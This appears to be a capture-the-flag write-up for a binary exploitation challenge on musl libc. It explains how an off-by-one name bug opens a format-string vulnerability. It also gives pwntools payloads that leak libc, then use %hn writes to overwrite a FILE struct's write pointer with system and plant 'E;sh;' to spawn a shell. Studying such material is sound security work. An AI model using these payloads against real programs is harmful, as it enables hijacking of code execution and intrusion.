# Beating Yellow King With Musl In NG+

This challenge mostly explores format strings and mallocng in Musl

Realizing the heap pointers lie in libc region is important, this can be used for further FSOP using format strings

## Walkthrough

### 1. Initial prep
To get format string vector, our class must be `D3rlord3` which is `0x00`
This can be done by using the off-by-one vulnerability in `make_char` while entering name,
where the null terminator is added at `chars_read+1` which modifies `class` of player to `0x00`

### 2. format strings and FSOP

```python
pl = b'%c'*8+b'%c%c%s..'+p64(0x404040) #leak libc
```

this payload leaks the libc address, since `0x404040` contains a heap pointer.

```python
libc.address = unpack(r.recvuntil(b'@@@').split(b'%%%')[1][:6],'all') - (0x7f3dfab88ca0-0x00007f3dfaac7000)
log.info(f'libc @ {hex(libc.address)}')
log.info(f'stdout file @ {hex(libc.sym["__stdout_FILE"])}')
```

here the offsets are calculated, and address of symbol `__stdout_FILE`

This is the source code for [file struct](https://git.musl-libc.org/cgit/musl/tree/src/internal/stdio_impl.h)

![debug](image.png)

At `vfprintf+270`, you can see `call qword ptr[rbx+0x48]` where `rbx` has file structure address.
`rdi` also has adddress of the file structure, ie the flag

that's why we make the flag `E;sh;` and change `stdout+72` to `system`

```python
#write E;sh;\x00 where E is 0x45 part of the flag file struct
pl = b'%c'*8+b'%c%c%29489c%hn..'+p64(stderr_file+1)
action(0)
r.sendline(pl)
pl = b'%c'*8+b'%c%c%15198c%hn..'+p64(stderr_file+3)
action(0)
r.sendline(pl)

#change last 2 bytes of write ptr of file struct, points to a function for writing ?
offset_to_system = libc.sym['system'] & (0xffff)
print(hex(offset_to_system))

pl = b'%c'*8+f'%c%c%{offset_to_system-10}c%hn..'.encode()+p64(stderr_file+72)
print(len(pl))
action(0)
gdb.attach(r,'b *vfprintf+252')
r.sendline(pl)
```

here we overwrite overwrite the write function pointer, with system and the flag with `E;sh;\x00`
to preserve the `0x45` in flag

[Solve script](solve.py)
